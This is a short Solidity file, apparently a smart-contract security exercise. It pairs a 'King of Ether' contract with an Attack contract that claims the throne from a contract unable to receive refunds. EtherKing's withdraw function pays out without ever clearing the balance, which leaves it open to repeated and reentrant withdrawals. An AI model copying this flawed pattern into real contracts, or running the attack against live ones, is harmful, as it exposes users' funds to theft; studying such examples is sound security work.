// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

contract EtherKing {
    uint256 public preAmount;

    address public king;


    mapping (address=>uint) balance;

    /// amount should be grater than previous Amount;
    error insufficientAmount();

    ///failed to send
    error failed();

    ///king cannot withdraw ;
    error not_king();

    function claimThrown() external payable {
        if (msg.value <= preAmount) {
            revert insufficientAmount();
        }
        // (bool sent, ) = king.call{value: preAmount}("");
        // if (!sent) {
        //     revert failed();
        // }
        balance[msg.sender]=msg.value;
        preAmount = msg.value;
        king = msg.sender;
    }

    function withdraw() public {
        if(msg.sender==king){
            revert not_king();
        }
        uint amount=balance[msg.sender];
        (bool sent,) = msg.sender.call{value:amount}("");
        if(!sent){
            revert failed();
        }
    }


}

contract Attack {
    EtherKing etherking;

    constructor(EtherKing _etherking) {
        etherking = _etherking;
    }

    function attack() public payable {
        etherking.claimThrown{value:msg.value}();
    }
}
//0x7b96aF9Bd211cBf6BA5b0dd53aa61Dc5806b6AcE